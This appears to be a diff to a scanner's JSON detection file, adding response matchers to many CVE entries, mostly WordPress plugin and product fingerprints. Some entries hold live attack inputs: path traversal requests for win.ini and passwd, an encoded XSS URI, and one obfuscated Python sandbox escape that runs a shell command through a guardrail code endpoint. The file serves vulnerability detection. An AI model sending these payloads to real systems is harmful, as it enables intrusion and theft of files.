+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_48241",
@@ -27564,7 +28820,18 @@
               "cors",
               "data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "X-Interactsh-Version"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "nuclei_cve_2023_5003",
@@ -27827,7 +29094,24 @@
               "plugins",
               "wp-fastest-cache"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "WP Fastest Cache"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_6114",
@@ -27847,7 +29131,25 @@
               "wp-content",
               "backups-dup-lite"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "/tmp",
+                "<title>Index of"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_6505",
@@ -27907,7 +29209,24 @@
               "plugins",
               "backup-backup"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Backup Migration"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_6825",
@@ -27928,7 +29247,24 @@
               "plugins",
               "wp-file-manager"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "File Manager"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_6933",
@@ -27949,7 +29285,24 @@
               "plugins",
               "better-search-replace"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Better Search"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_7164",
@@ -27969,7 +29322,32 @@
               "wp-content",
               "uploads"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Index of"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "backwpup-[a-f0-9]{6}-(backups|temp)"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_7165",
@@ -27990,7 +29368,25 @@
               "uploads",
               "jetbackup"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Index of",
+                "jetbackup"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_7327",
@@ -28007,7 +29403,25 @@
               "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows",
               "win.ini"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Mail",
+                "files"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_0200",
@@ -28273,7 +29687,29 @@
             "path_contains": [
               "info"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "database_type",
+                "deployment_type"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "0.42.2",
+                "0.43.1",
+                "0.44.4"
+              ],
+              "condition": "or"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_25735",
@@ -28371,7 +29807,28 @@
               "rest",
               "server;.jsp"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Authentication required",
+                "buildNumber",
+                "internalId",
+                "login.html",
+                "server version"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_27199",
@@ -28387,7 +29844,25 @@
             "path_contains": [
               "diagnostic.jsp"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "CPU & Memory Usage",
+                "Debug Logging"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_27292",
@@ -28474,7 +29949,46 @@
               "file:",
               "passwd"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "image/jpeg"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "image/jpeg"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "nuclei_cve_2024_2879",
@@ -28675,7 +30189,33 @@
               "Main",
               "DatabaseSearch"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<title>RSS feed",
+                "Hello from search text:42</title>"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "text/javascript"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_32399",
@@ -28693,7 +30233,25 @@
               "windows",
               "win.ini"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "[fonts]",
+                "for 16-bit app support"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_32735",
@@ -29050,7 +30608,40 @@
             "path_contains": [
               "/tmp/temp.db%3f.1.1.1.1a-1.css"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "SQLite format",
+                "sessionId"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "[pid",
+                "mod_antiloris"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "nuclei_cve_2024_40711",
@@ -29225,7 +30816,27 @@
             "path_contains": [
               "package.json"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "license",
+                "main",
+                "name",
+                "version"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_49357",
@@ -29333,7 +30944,24 @@
               "plugins",
               "easy-digital-downloads"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Easy Digital Downloads"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_50967",
@@ -29459,7 +31087,32 @@
               "adama",
               "downloadService"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "filename="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_57726",
@@ -29576,7 +31229,26 @@
               "web_cste",
               "product.ini"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "HostName",
+                "[PRODUCT]",
+                "[WLAN]"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_8252",
@@ -29597,7 +31269,24 @@
               "plugins",
               "clean-login"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Clean Login"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_8877",
@@ -29615,7 +31304,26 @@
               "date_start",
               "date_end"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "START APPLICATION",
+                "category\":",
+                "codeStr\":"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_8963",
@@ -29708,7 +31416,24 @@
               "plugins",
               "uix-shortcodes"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Uix Shortcodes"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_10162",
@@ -29765,7 +31490,26 @@
               "$SCHEMAS$",
               "Filename"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bit app support",
+                "extensions",
+                "fonts"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_1232",
@@ -29786,7 +31530,24 @@
               "pages",
               "per_page"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "glsr-form-wrap"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_12841",
@@ -29807,7 +31568,24 @@
               "plugins",
               "bookit"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bookit"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_13339",
@@ -29827,7 +31605,33 @@
               "hippoo_serve",
               "passwd"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_13773",
@@ -29848,7 +31652,24 @@
               "plugins",
               "woocommerce-delivery-notes"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Print Invoice & Delivery Notes"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_14998",
@@ -29937,7 +31758,16 @@
               "themes",
               "the-wound"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_27225",
@@ -29954,7 +31784,16 @@
               "trufusionPortal",
               "internal_admin_contact_login.jsp"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_28228",
@@ -30004,7 +31843,25 @@
             "path_contains": [
               "login_ok.htm"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "DAEnetIP4",
+                "session="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_32614",
@@ -30025,7 +31882,24 @@
               "plugins",
               "eventon-lite"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "EventON Lite"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_34023",
@@ -30116,7 +31990,24 @@
               "site",
               "login.html"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "URVE Web Manager"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_4210",
@@ -30223,7 +32114,16 @@
               "upload",
               "file"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_49825",
@@ -30240,7 +32140,19 @@
               "webapi",
               "ping"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "server_version",
+                "teleport"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_52472",
@@ -30258,7 +32170,25 @@
               "rest",
               "wikis"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "QueryException: Exception while executing query. Query statement",
+                "xwiki"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_55523",
@@ -30319,7 +32249,26 @@
               "webjars",
               "wiki%3Axwiki"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "xwiki.editcomment=",
+                "xwiki.encoding=",
+                "xwiki.plugins="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_55748",
@@ -30337,7 +32286,26 @@
               "WebHome",
               "resource"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "xwiki.editcomment=",
+                "xwiki.encoding=",
+                "xwiki.plugins="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_55749",
@@ -30548,7 +32516,16 @@
               "plugins",
               "ioncube-tester-plus"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_10580",
@@ -30569,7 +32546,24 @@
               "plugins",
               "hippoo"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Hippoo"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_1368",
@@ -30590,7 +32584,24 @@
               "plugins",
               "video-conferencing-with-zoom-api"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Video Conferencing with Zoom"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_15826",
@@ -30611,7 +32622,24 @@
               "plugins",
               "profile-builder"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Profile Builder"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_1830",
@@ -30632,7 +32660,18 @@
               "plugins",
               "quick-playground"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Quick Playground"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_2025",
@@ -30653,7 +32692,25 @@
               "admins",
               "term"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"admins\"",
+                "\"label\""
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_21445",
@@ -30788,7 +32845,16 @@
               "plugins",
               "geo-mashup"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_25892",
@@ -30841,7 +32907,24 @@
             "path_contains": [
               "status"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "mindsdb_version"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_27542",
@@ -30862,7 +32945,24 @@
               "plugins",
               "woocommerce-wholesale-lead-capture"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "WooCommerce Wholesale Lead Capture"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_29059",
@@ -30923,7 +33023,25 @@
               "nvidia-nim",
               "get-token"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "access_token",
+                "token_type"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_30928",
@@ -31047,7 +33165,26 @@
             "path_contains": [
               "system"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "hostname",
+                "os_name",
+                "os_version"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_3296",
@@ -31068,7 +33205,24 @@
               "plugins",
               "everest-forms"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Everest Forms"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_3300",
@@ -31089,7 +33243,24 @@
               "plugins",
               "everest-forms-pro"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Everest Forms"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_3326",
@@ -31139,7 +33310,16 @@
               "profile_pictures",
               "secret_key"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_33626",
@@ -31155,7 +33335,24 @@
             "path_contains": [
               "models"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "lmdeploy"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_3396",
@@ -31212,7 +33409,16 @@
               "version"
             ]
           },
-          "method": "POST"
+          "method": "POST",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_3576",
@@ -31233,7 +33439,24 @@
               "plugins",
               "planyo-online-reservation-system"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Planyo online reservation system"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_4020",
@@ -31305,7 +33528,33 @@
             "Content-Type": "application/json",
             "Accept": "application/json"
           },
-          "body": "{\n  \"custom_code\": \"def apply_guardrail(inputs, request_data, input_type):\\n    obj = str.mro()[1]\\n    def g(fn):\\n        yield fn.placeholder\\n    c = g(None).gi_code\\n    gn = \\\"_\\\"+\\\"_gl\\\"+\\\"ob\\\"+\\\"als\\\"+\\\"_\\\"+\\\"_\\\"\\n    cn = \\\"_\\\"+\\\"_co\\\"+\\\"de_\\\"+\\\"_\\\"\\n    obj.__setattr__(g, cn, c.replace(co_names=(gn,)))\\n    for v in g(http_get):\\n        gd = v\\n        break\\n    bn = \\\"_\\\"+\\\"_bu\\\"+\\\"ilt\\\"+\\\"ins\\\"+\\\"_\\\"+\\\"_\\\"\\n    imp = gd[bn][\\\"_\\\"+\\\"_im\\\"+\\\"po\\\"+\\\"rt_\\\"+\\\"_\\\"]\\n    return {\\\"rce\\\": imp(\\\"os\\\").popen(\\\"id\\\").read()}\",\n  \"test_input\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": \"test\"\n      }\n    ]\n  }\n}\n"
+          "body": "{\n  \"custom_code\": \"def apply_guardrail(inputs, request_data, input_type):\\n    obj = str.mro()[1]\\n    def g(fn):\\n        yield fn.placeholder\\n    c = g(None).gi_code\\n    gn = \\\"_\\\"+\\\"_gl\\\"+\\\"ob\\\"+\\\"als\\\"+\\\"_\\\"+\\\"_\\\"\\n    cn = \\\"_\\\"+\\\"_co\\\"+\\\"de_\\\"+\\\"_\\\"\\n    obj.__setattr__(g, cn, c.replace(co_names=(gn,)))\\n    for v in g(http_get):\\n        gd = v\\n        break\\n    bn = \\\"_\\\"+\\\"_bu\\\"+\\\"ilt\\\"+\\\"ins\\\"+\\\"_\\\"+\\\"_\\\"\\n    imp = gd[bn][\\\"_\\\"+\\\"_im\\\"+\\\"po\\\"+\\\"rt_\\\"+\\\"_\\\"]\\n    return {\\\"rce\\\": imp(\\\"os\\\").popen(\\\"id\\\").read()}\",\n  \"test_input\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": \"test\"\n      }\n    ]\n  }\n}\n",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "rce\":",
+                "success\":true"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "uid=[0-9]+.*gid=[0-9]+.*"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_40308",
@@ -31389,7 +33638,25 @@
             "path_contains": [
               "agents"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "agent_file",
+                "agents"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_46670",
@@ -31406,7 +33673,25 @@
               "BazaR",
               "formulaire"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bazar",
+                "yeswiki"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_47717",
@@ -31425,7 +33710,35 @@
           },
           "headers": {
             "Accept": "application/json"
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "scripts"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "alarms",
+                "devices",
+                "variables",
+                "views"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_4987",
@@ -31446,7 +33759,18 @@
               "plugins",
               "sureforms"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "SureForms"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_5073",
@@ -31600,7 +33924,24 @@
               "plugins",
               "burst-statistics"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "burst statistics"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_9198",
@@ -31616,7 +33957,25 @@
             "path_contains": [
               "auto_login"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "access_token",
+                "refresh_token"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_9506",
